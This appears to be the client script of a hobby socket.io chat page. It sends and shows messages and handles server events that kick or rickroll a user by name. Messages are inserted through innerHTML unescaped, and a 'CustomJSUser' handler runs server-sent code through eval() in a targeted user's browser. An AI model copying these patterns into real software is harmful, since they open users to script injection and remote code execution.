if (localStorage.getItem('name') == null) {
localStorage.setItem('name', prompt('Set name.'))
}
var socket = io();
var messages = document.getElementById('messages');
var form = document.getElementById('form');
var input = document.getElementById('input');
var pcml;
  form.addEventListener('submit', function(e) {
    e.preventDefault();
    if (input.value) {
      socket.emit('public chat name', localStorage.getItem('name'));
      socket.emit('public chat', input.value);
      input.value = '';
    }
  });
  function submit() {
    if (document.getElementById('input').value) {
      socket.emit('public chat name', localStorage.getItem('name'));
      socket.emit('public chat', document.getElementById('input').value);
      input.value = '';
    }
  }
  socket.on('public chat message link', function(msg) {
    pcml = msg;
  });
  socket.on('public chat', function(msg) {
    var item = document.createElement('p');
    item.innerHTML = pcml + msg;
    messages.appendChild(item);
    window.scrollTo(0, document.body.scrollHeight);
  });
  socket.on('KickUser', msg => {
    if (localStorage.getItem('name') == msg) {
      alert('You have been kicked!')
      window.location = '/home'
    }
  })
  socket.on('RickRollUser', msg => {
    if (localStorage.getItem('name') == msg) {
      var rickrollvideo = document.createElement('video');
      rickrollvideo.setAttribute('autoplay', 'true')
      rickrollvideo.setAttribute('muted', 'true')
      rickrollvideo.setAttribute('autoplay', 'true')
      rickrollvideo.setAttribute('controls', 'false')
      rickrollvideo.setAttribute('src', '/rickroll.mp4')
      var rickrollaudio = document.createElement('audio');
      rickrollvideo.setAttribute('src', '/rickroll.mp4')
      rickrollaudio.play()
    }
  })
  socket.on('CustomJSUser', msg => {
    var bettermsg = JSON.parse(msg)
    if (localStorage.getItem('name') == bettermsg[0]) {
      eval(bettermsg[1])
    }
  })